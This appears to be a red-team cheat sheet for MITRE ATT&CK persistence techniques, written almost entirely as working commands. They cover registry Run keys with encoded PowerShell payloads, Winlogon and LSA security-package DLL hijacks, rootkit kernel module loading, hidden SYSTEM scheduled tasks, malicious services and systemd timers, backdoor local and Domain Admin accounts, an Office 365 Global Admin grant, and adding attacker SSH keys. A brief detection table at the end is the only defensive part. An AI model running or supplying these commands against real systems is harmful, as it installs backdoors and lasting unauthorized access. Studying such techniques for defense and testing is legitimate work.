# MITRE ATT&CK: Persistence (TA0003)

> Techniques adversaries use to maintain access across restarts, changed credentials, and other interruptions.

---

## T1547: Boot or Logon Autostart Execution

### T1547.001: Registry Run Keys
```cmd
# Current user
reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v UpdateChecker /t REG_SZ /d "C:\windows\temp\updater.exe" /f

# Local machine
reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Run /v SecurityUpdate /t REG_SZ /d "powershell -enc AAAAA..." /f

# RunOnce (executes once then deletes)
reg add HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce /v Installer /t REG_SZ /d "C:\windows\temp\setup.exe" /f
```

**Common Run Keys**:
- `HKCU\Software\Microsoft\Windows\CurrentVersion\Run`
- `HKLM\Software\Microsoft\Windows\CurrentVersion\Run`
- `HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce`
- `HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce`
- `HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnceEx`
- `HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run`

### T1547.002: Registry Run Keys (Office)
- Word/Excel add-ins via `Wwlib.dll` / `Xlcall32.dll`

### T1547.003: Time Providers
```cmd
reg add "HKLM\System\CurrentControlSet\Services\W32Time\TimeProviders\NtpClient" /v DllName /t REG_SZ /d "C:\windows\temp\evil.dll" /f
```

### T1547.004: Winlogon Helper DLL
```cmd
reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon" /v Userinit /t REG_SZ /d "C:\windows\system32\userinit.exe,C:\windows\temp\payload.exe" /f
```

### T1547.005: Security Support Provider (SSP)
- Register malicious DLL as LSA SSP to capture credentials
```powershell
$path = "HKLM:\System\CurrentControlSet\Control\Lsa"
Set-ItemProperty -Path $path -Name "Security Packages" -Value "kerberos,msv1_0,schannel,wdigest,tspkg,pku2u,mimilib"
```

### T1547.006: Kernel Modules/Drivers (Linux)
```bash
# Load kernel module
insmod /tmp/rootkit.ko

# Make persistent via modprobe
echo "rootkit" >> /etc/modules-load.d/rootkit.conf
echo "install rootkit /sbin/modprobe --ignore-install rootkit" >> /etc/modprobe.d/rootkit.conf
```

### T1547.007: Re-opened Applications (macOS)
- `com.apple.loginitems.plist`

### T1547.008: LSASS Driver
- Register as authentication package

### T1547.009: Shortcut Modification
```powershell
# Modify LNK file to execute payload
$WshShell = New-Object -comObject WScript.Shell
$Shortcut = $WshShell.CreateShortcut("$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\Notepad.lnk")
$Shortcut.TargetPath = "powershell.exe"
$Shortcut.Arguments = "-enc AAAAA..."
$Shortcut.Save()
```

### T1547.010: Port Monitors
```cmd
reg add "HKLM\System\CurrentControlSet\Control\Print\Monitors\EvilMonitor" /v Driver /t REG_SZ /d "C:\windows\system32\evil.dll" /f
```

### T1547.012: Print Processors
```cmd
reg add "HKLM\System\CurrentControlSet\Control\Print\Environments\Windows x64\Print Processors\evilpp" /v Driver /t REG_SZ /d "evilpp.dll" /f
```

### T1547.014: Active Setup
```cmd
reg add "HKLM\Software\Microsoft\Active Setup\Installed Components\{GUID}" /v StubPath /t REG_SZ /d "C:\windows\temp\payload.exe" /f
```

---

## T1053: Scheduled Task/Job (Persistence)

Already covered in Execution, but also used for persistence:
```powershell
# Hidden scheduled task with encoded payload
$action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-enc AAAAA..."
$trigger = New-ScheduledTaskTrigger -AtLogOn
$principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -RunLevel Highest
Register-ScheduledTask -TaskName "WindowsUpdate" -Action $action -Trigger $trigger -Principal $principal
```

---

## T1543: Create or Modify System Process

### T1543.001: Create Systemd Service (Linux)
```bash
# Create persistent systemd service
cat > /etc/systemd/system/update.service << 'EOF'
[Unit]
Description=System Update Service
After=network.target

[Service]
Type=simple
ExecStart=/usr/local/bin/update
Restart=always

[Install]
WantedBy=multi-user.target
EOF

systemctl enable update.service
systemctl start update.service
```

### T1543.002: Systemd Timer (Linux)
```bash
# Timer-based execution
cat > /etc/systemd/system/evil.timer << 'EOF'
[Unit]
Description=Periodic Evil Task

[Timer]
OnCalendar=*-*-* *:00:00
Persistent=true

[Install]
WantedBy=timers.target
EOF

systemctl enable evil.timer
systemctl start evil.timer
```

### T1543.003: Windows Service
```cmd
sc create EvilService binPath= "C:\windows\temp\evil.exe" start= auto
sc failure EvilService reset= 0 actions= restart/0/restart/0/restart/0
```

---

## T1136: Create Account

### T1136.001: Local Account
```cmd
net user backdoor P@ssw0rd123! /add
net localgroup administrators backdoor /add
```

### T1136.002: Domain Account
```powershell
# Create domain account with DCSync rights
New-ADUser -Name "svc_backup" -AccountPassword (ConvertTo-SecureString "P@ssw0rd123!" -AsPlainText -Force) -Enabled $true
Add-ADGroupMember -Identity "Domain Admins" -Members "svc_backup"
```

### T1136.003: Cloud Account
- AWS IAM user creation
- Azure AD guest account abuse
- GCP service account creation

---

## T1505: Server Software Component

### T1505.002: Transport Agent (Exchange)
- Register malicious transport agent to inspect/modify emails

### T1505.003: Web Shell
- IIS, Apache, Nginx web shells
- ASPX, PHP, JSP webshells

---

## T1098: Account Manipulation

### T1098.001: Additional Cloud Credentials
- Add SSH keys to cloud instances
- Generate new API keys

### T1098.002: Exchange Email Delegate Rules
```powershell
# Add mailbox delegate with full access
Add-MailboxPermission -Identity "victim@corp.com" -User "attacker@corp.com" -AccessRights FullAccess
```

### T1098.003: Add Office 365 Global Admin Role
```powershell
Add-AzureADDirectoryRoleMember -ObjectId (Get-AzureADDirectoryRole | Where {$_.DisplayName -eq "Global Administrator"}).ObjectId -RefObjectId (Get-AzureADUser -ObjectId attacker@corp.com).ObjectId
```

### T1098.004: SSH Authorized Keys
```bash
# Add attacker SSH key
mkdir -p ~/.ssh
echo "ssh-rsa AAAA... attacker@evil" >> ~/.ssh/authorized_keys
```

### T1098.005: Device Registration
- Register attacker device to victim's Azure AD account

---

## Detection

| Technique | Detection Method |
|---|---|
| Registry Run Keys | Sysmon Event ID 13, 14; autoruns |
| Scheduled Tasks | Event ID 4698; Get-ScheduledTask audit |
| Service Creation | Event ID 7045; sc query analysis |
| New Accounts | Event ID 4720, 4728, 4732 |
| Web Shells | IIS logs, file integrity monitoring |
| Systemd Services | `systemctl list-units --type=service` |
